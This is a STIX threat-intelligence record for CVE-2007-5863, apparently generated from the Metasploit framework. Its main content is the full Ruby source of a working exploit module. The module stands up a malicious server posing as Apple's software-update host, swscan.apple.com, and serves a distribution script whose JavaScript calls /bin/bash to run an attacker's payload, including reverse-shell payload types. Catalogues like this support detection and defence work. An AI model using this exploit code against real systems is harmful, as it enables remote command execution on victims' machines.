{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--dce76fa7-e15c-4040-b531-39a21209fe55",
    "created": "2024-08-14T16:34:28.761816Z",
    "modified": "2024-08-14T16:34:28.761819Z",
    "name": "Apple OS X Software Update Command Execution",
    "description": " This module exploits a feature in the Distribution Packages which are used in the Apple Software Update mechanism. This feature allows for arbitrary command execution through JavaScript. This exploit provides the malicious update server. Requests must be redirected to this server by other means for this exploit to work. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/osx/browser/software_update.rb",
            "external_id": "software_update.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-5863"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Apple OS X Software Update Command Execution',\n      'Description'    => %q{\n          This module exploits a feature in the Distribution Packages,\n        which are used in the Apple Software Update mechanism. This feature\n        allows for arbitrary command execution through JavaScript. This exploit\n        provides the malicious update server. Requests must be redirected to\n        this server by other means for this exploit to work.\n      },\n      'Author'         => [ 'Moritz Jodeit <moritz[at]jodeit.org>' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2007-5863'],\n          ['OSVDB', '40722'],\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\",\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd cmd_bash',\n              'RequiredCmd' => 'generic perl ruby bash telnet bash-tcp',\n            }\n        },\n      'Platform'\t=> 'osx',\n      'Targets'\t=>\n        [\n          [\n            'Automatic',\n            {\n              'Platform' => [ 'unix' ],\n              'Arch'     => ARCH_CMD,\n            },\n          ],\n        ],\n      'DisclosureDate' => '2007-12-17',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptPort.new('SRVPORT', [ true, \"The local port to listen on.\", 80 ]),\n        OptString.new('URIPATH', [ true, \"The URI to use for this exploit.\", \"/\" ])\n      ])\n  end\n\n  # Encode some characters using character entity references and escape any\n  # quotation characters, by splitting the string into multiple parts.\n  def encode_payload(payload)\n    encoded = payload.gsub(/[&<>\"']/) do |s|\n      case s\n      when '&'\n        \"&amp;\"\n      when '<'\n        \"&lt;\"\n      when '>'\n        \"&gt;\"\n      when '\"'\n        '\"+\\'\"\\'+\"'\n      when '\\''\n        \"&apos;\"\n      end\n    end\n    return '\"' + encoded + '\"'\n  end\n\n  # Generate the initial catalog file with references to the\n  # distribution script, which does the actual exploitation.\n  def generate_catalog(server)\n    languages = [ \"\", \"Dutsch\", \"English\", \"French\", \"German\", \"Italian\", \"Japanese\",\n      \"Spanish\", \"da\", \"fi\", \"ko\", \"no\", \"pt\", \"sv\", \"zh_CN\", \"zh_TW\" ]\n    productkey = rand_text_numeric(3) + \"-\" + rand_text_numeric(4)\n    distfile = rand_text_alpha(8) + \".dist\"\n\n    sucatalog = '<?xml version=\"1.0\" encoding=\"UTF-8\"?>'\n    sucatalog << '<!DOCTYPE plist PUBLIC \"-//Apple Computer//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">'\n    sucatalog << '<plist version=\"1.0\">'\n    sucatalog << '<dict>'\n    sucatalog << '<key>Products</key><dict>'\n    sucatalog << \"<key>#{productkey}</key><dict>\"\n    sucatalog << '<key>Distributions</key><dict>'\n\n    languages.each do |l|\n      sucatalog << \"<key>#{l}</key><string>http://#{server}/#{distfile}</string>\\n\"\n    end\n\n    sucatalog << '</dict></dict></dict></dict></plist>'\n\n    return sucatalog\n  end\n\n  # Generate distribution script, which calls our payload using JavaScript.\n  def generate_dist(payload)\n    func = rand_text_alpha(8)\n\n    dist = '<?xml version=\"1.0\" encoding=\"UTF-8\"?>'\n    dist << \"<installer-gui-script minSpecVersion='1'>\"\n    dist << '<options allow-external-scripts = \"yes\"/>'\n    dist << \"<choices-outline ui='SoftwareUpdate'>\"\n    dist << \"<line choice='su'/>\"\n    dist << \"</choices-outline>\"\n    dist << \"<choice id='su' visible ='#{func}()'/>\"\n    dist << \"<script>\"\n    dist << \"function #{func}() { system.run('/bin/bash', '-c', #{encode_payload(payload)}); }\"\n    dist << \"</script>\"\n    dist << \"</installer-gui-script>\"\n\n    return dist\n  end\n\n  def on_request_uri(cli, request)\n    date = Time.now\n    server = \"swscan.apple.com\"\n\n    header = {\n      'Content-Type' => 'text/plain',\n      'Last-Modified' => date,\n      'Date' => date,\n    }\n\n    if request.uri =~ /\\.sucatalog$/\n      print_status(\"Sending initial distribution package\")\n      body = generate_catalog(server)\n    elsif request.uri =~ /\\.dist$/\n      print_status(\"Sending distribution script\")\n      return if ((p = regenerate_payload(cli)) == nil)\n      body = generate_dist(p.encoded)\n    else\n      return\n    end\n    send_response(cli, body, header)\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-12-17",
    "x_mitre_platforms": [
        "[ 'unix' ]"
    ]
}